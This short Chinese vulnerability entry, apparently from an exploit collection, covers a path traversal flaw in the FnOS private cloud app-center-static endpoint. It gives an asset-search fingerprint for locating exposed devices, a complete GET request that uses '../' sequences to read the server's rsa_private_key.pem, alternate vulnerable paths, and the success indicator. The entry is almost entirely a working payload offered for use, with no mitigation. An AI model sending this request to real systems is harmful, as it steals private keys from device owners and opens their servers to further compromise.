# 飞牛私有云FnOSapp-center-static存在目录遍历漏洞

飞牛私有云 ｜ 路径遍历 ｜ —
- **指纹**：`app="飞牛-私有云fnOS"`
- **请求**：`GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../usr/trim/etc/rsa_private_key.pem HTTP/1.1`

**Payload**
```
多个路径
/app-center-static/serviceicon/trim.media/
/app-center-static/xxx/xx/
Host:
```
- **响应特征**：200